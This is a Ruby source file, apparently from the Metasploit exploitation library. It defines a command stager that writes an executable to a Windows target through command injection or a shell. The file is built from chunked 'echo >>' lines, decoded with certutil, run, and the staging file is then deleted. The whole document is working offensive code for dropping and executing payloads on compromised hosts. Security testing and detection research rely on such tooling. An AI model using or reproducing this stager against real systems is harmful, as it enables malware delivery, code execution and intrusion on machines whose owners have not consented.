# -*- coding: binary -*-

require 'rex/text'
require 'rex/arch'
require 'msf/core/framework'

module Rex
module Exploitation

###
#
# This class provides the ability to create a sequence of commands from an executable.
# When this sequence is ran via command injection or a shell, the resulting exe will
# be written to disk and executed.
#
# This particular version uses Windows certutil to base64 decode a file,
# created via echo >>, and decode it to the final binary.
#
#
# Written by xistence
# Original discovery by @mattifestation - https://gist.github.com/mattifestation/47f9e8a431f96a266522
#
###

class CmdStagerCertutil < CmdStagerBase

  def initialize(exe)
    super

    @var_encoded = Rex::Text.rand_text_alpha(5)
    @var_decoded = Rex::Text.rand_text_alpha(5)
    @decoder     = nil # filled in later
  end


  # Override just to set the extra byte count
  # @param opts [Array] The options to generate the command line
  # @return [Array] The complete command line
  def generate_cmds(opts)
    # Set the start/end of the commands here (vs initialize) so we have @tempdir
    @cmd_start = "echo "
    @cmd_end   = ">>#{@tempdir}#{@var_encoded}.b64"
    xtra_len = @cmd_start.length + @cmd_end.length + 1
    opts.merge!({ :extra => xtra_len })
    super
  end


  # Simple base64 encoder for the executable
  # @param opts [Array] The options to generate the command line
  # @return [String] Base64 encoded executable
  def encode_payload(opts)
    Rex::Text.encode_base64(@exe)
  end


  # Combine the parts of the encoded file with the stuff that goes
  # before / after it.
  # @param parts [Array] Splitted commands
  # @param opts [Array] The options to generate the command line
  # @return [Array] The command line
  def parts_to_commands(parts, opts)

    cmds = []
    parts.each do |p|
      cmd = ''
      cmd << @cmd_start
      cmd << p
      cmd << @cmd_end
      cmds << cmd
    end

    cmds
  end


  # Generate the commands that will decode the file we just created
  # @param opts [Array] The options to generate the command line
  # @return [Array] The certutil Base64 decoder part of the command line
  def generate_cmds_decoder(opts)

    cmds = []
    cmds << "certutil -decode #{@tempdir}#{@var_encoded}.b64 #{@tempdir}#{@var_decoded}.exe"
    return cmds
  end


  # We override compress commands just to stick in a few extra commands
  # last second..
  # @param cmds [Array] Complete command line
  # @param opts [Array] Extra options for command line generation
  # @return [Array] The complete command line including cleanup
  def compress_commands(cmds, opts)
    # Make it all happen
    cmds << "#{@tempdir}#{@var_decoded}.exe"

    # Clean up after unless requested not to..
    if (not opts[:nodelete])
      cmds << "del #{@tempdir}#{@var_encoded}.b64"
      # NOTE: We won't be able to delete the exe while it's in use.
    end

    super
  end

  # Windows uses & to concat strings
  #
  # @return [String] Concat operator
  def cmd_concat_operator
    " & "
  end

end
end
end
